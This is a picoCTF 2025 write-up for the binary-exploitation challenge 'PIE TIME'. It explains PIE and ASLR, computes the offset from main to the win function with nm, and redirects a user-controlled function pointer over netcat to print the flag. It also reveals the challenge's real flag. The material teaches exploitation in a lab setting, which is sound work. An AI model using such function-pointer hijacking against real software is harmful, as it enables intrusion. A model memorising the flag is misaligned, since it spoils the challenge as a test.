**Author**: @brynrefill<br>
**Completion date**: 2025-07-10

## General information
- **Name**: PIE TIME
- **Event**: picoCTF 2025
- **Category**: pwn (binary exploitation)
- **Difficulty**: easy
- **Platform**: picoCTF
- **Release date**: 2025-03-07

#### Description:
> _Can you try to get the flag? Beware we have PIE!_<br>
_Connect to the program with netcat:_<br>
_$ nc rescued-float.picoctf.net &lt;port&gt;_<br>
_The program's source code can be downloaded [here](./vuln.c)._<br>
_The binary can be downloaded [here](./vuln)._

&lt;port&gt; is a placeholder I use for the port you need to connect to, because it changes every time the challenge is started.

## What I used
- **Program's source code** and **binary** files reported in the description of the challenge
- **file** and **nm** Unix/Linux utilities to perform a basic static analysis of the binary file, and other minor commands
- **Function pointer hijacking** technique to redirect the control flow of the program by exploiting a function pointer

## Solution steps
#### STEP 1: source code analysis
I started by analyzing the program's source code and understanding how it works.

**segfault_handler** function:
```C
void segfault_handler() {
    printf("Segfault Occurred, incorrect address.\n");
    exit(0);
}
```
it is a signal handler for SIGSEGV signals. When a segmentation fault occurs, this signal is sent by the OS to the process running this program and this function will be called. In this case prints the above message and terminates successfully.

**win** function:
```C
int win() {
    [...]

    printf("You won!\n");
    // Open file
    fptr = fopen("flag.txt", "r");

    [...]

    // Read contents from file
    c = fgetc(fptr);
    while (c != EOF)
    {
        printf ("%c", c);
        c = fgetc(fptr);
    }

    [...]
}
```
it reads a local file, where the flag is located, and prints the content. This function is never called by the main function, unless we find a way to do it (we'll see later).

**main** function:
```C
int main() {
    signal(SIGSEGV, segfault_handler);
    setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

    printf("Address of main: %p\n", &main);

    unsigned long val;
    printf("Enter the address to jump to, ex => 0x12345: ");
    scanf("%lx", &val);
    printf("Your input: %lx\n", val);

    void (*foo)(void) = (void (*)())val;
    foo();
}
```
it registers the segfault_handler function to handle SIGSEGV signals and disables buffering for standard output, so the program will immediately print the output without waiting for a buffer to fill (e.g. useful if a signal might interfere with normal output behavior). It then prints the memory address of the main function itself and prompts the user to enter a memory address to jump to. Additionally, by means of a function pointer, it calls the function at the memory address previously provided by the user.

#### STEP 2: binary file analysis
I continued by doing a basic static analysis of the binary file.
```bash
$ file ./vuln
./vuln: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0072413e1b5a0613219f45518ded05fc685b680a, for GNU/Linux 3.2.0, not stripped
```
First of all, I noticed that it is specified as a "**pie** executable".

[PIEs](https://en.wikipedia.org/wiki/Position-independent_code#Position-independent_executables) are executables designed to be loaded at any memory address without compromising their functionalities when executed. They are often used with [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization), a security technique that randomizes the memory address where the program will be loaded into memory at each execution.

In such binary files, the offset between functions and other symbols does not change because it's determined at compile time, even if ASLR randomizes the base memory address of the entire code.

Since the program allows the user to insert a memory address to jump to, we can use the **function pointer hijacking** tecnique to bypass the above mentioned security measure.

I found the memory addresses of the main and win functions in the binary file (the ones determined at compile time).
```bash
$ nm ./vuln | grep -wE "main|win"
000000000000133d T main
00000000000012a7 T win
```

I then calculated the offset between them.
```bash
$ printf "0x%X\n" $((0x133d - 0x12a7))
0x96
```
The main function will always be 150 (0x96 in decimal) bytes after the win function.

#### STEP 3: exploitation
Finally, I connected to the remote program and entered the new memory address of the win function as input, obtaining the flag.
```bash
$ nc rescued-float.picoctf.net <port>
Address of main: 0x5ea40254633d
Enter the address to jump to, ex => 0x12345: 0x5EA4025462A7
Your input: 5EA4025462A7
You won!
picoCTF{#####_########_############_########}
```
I dinamically calculated it similarly to before.
```bash
$ printf "0x%X\n" $((0x5ea40254633d - 0x96))
0x5EA4025462A7
```

## Flag
<details><summary>Click to reveal the flag</summary>

```
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_80c3b8b7}
```

</details>

## Screenshots
No screenshots.

## Personal notes
No personal notes.

## References
No references.
